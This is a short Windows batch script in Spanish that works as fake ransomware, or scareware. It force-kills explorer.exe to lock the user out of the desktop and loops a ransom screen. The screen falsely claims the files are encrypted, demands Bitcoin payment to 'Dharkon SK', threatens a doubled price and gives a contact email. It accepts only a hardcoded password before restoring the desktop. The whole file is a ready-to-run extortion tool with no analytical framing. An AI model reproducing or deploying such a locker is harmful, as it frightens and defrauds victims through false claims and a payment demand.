color 0A
@echo off 
title @A6 Decrypt0r@
taskkill /f /im explorer.exe
:bucle 
cls               
echo ===================================================
echo      Upss... Sus Archivos han sido Encriptados
echo ===================================================      ! Si no Paga en el Tiempo Especificado
echo Que Ocurrio con mis Archivos?                              el Precio se Duplicara.
echo(
echo Sus Archivos han sido Encriptados si quiere                   ___________
echo recuperarlos y volver a tener acceso a ellos                 /           \ 
echo Tendra que pagar con Bitcoin a Dharkon SK                    I___________I
echo  y el una ves le page le dara un Codigo como                 I           I
echo Password Ingreselo y sus Archivos se                         I           I
echo Desencriptaran.                                              I           I   %date% - dom. 26/3/2023
echo ===================================================          I           I      
echo Si es un Usuario de Bajos Ingresos escriba a                 I___________I                 $50
echo dharkonsk@gmail.com
echo ===================================================          
set /p pass=Ingrese el Password: 
if %pass%==Vig74fLui22 (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Puede Continuar...
start explorer.exe 
pause
exit